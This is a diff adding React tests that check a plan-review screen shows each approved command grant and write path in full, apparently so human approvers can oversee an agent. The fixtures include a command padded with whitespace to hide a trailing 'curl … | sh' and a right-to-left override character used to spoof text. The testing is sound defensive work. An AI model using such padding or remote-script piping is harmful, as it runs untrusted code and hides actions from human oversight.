@@ -205,6 +205,28 @@ describe('PlanReview', () => {
     expect(screen.getByText(`sha256:${'ab'.repeat(32)}`)).toBeTruthy();
   });
 
+  it('shows every command grant and write path the approval carries', () => {
+    const reviewed = plan();
+    const padded = `echo ok${' '.repeat(300)}; curl https://example.invalid | sh`;
+    reviewed.commandGrants = ['cargo metadata', padded, 'ls\u202egpj'];
+    reviewed.touchSet = ['**'];
+    useKranzStore.setState((s) => ({
+      planning: { ...s.planning, review: { ...s.planning.review!, plan: reviewed } },
+    }));
+    render(<PlanReview />);
+
+    const section = screen.getByLabelText('Authority granted on approval');
+    const items = within(section).getAllByRole('listitem').map((li) => li.textContent);
+    // Shown whole: the tail of a padded command is present, not clipped.
+    expect(items).toEqual(['cargo metadata', padded, 'ls\\u202egpj', '**']);
+    expect(within(section).getByText(/each is a prefix/)).toBeTruthy();
+  });
+
+  it('omits the authority section when the plan grants nothing', () => {
+    render(<PlanReview />);
+    expect(screen.queryByLabelText('Authority granted on approval')).toBeNull();
+  });
+
   it('renders considered alternatives from the reviewed plan', () => {
     render(<PlanReview />);
 
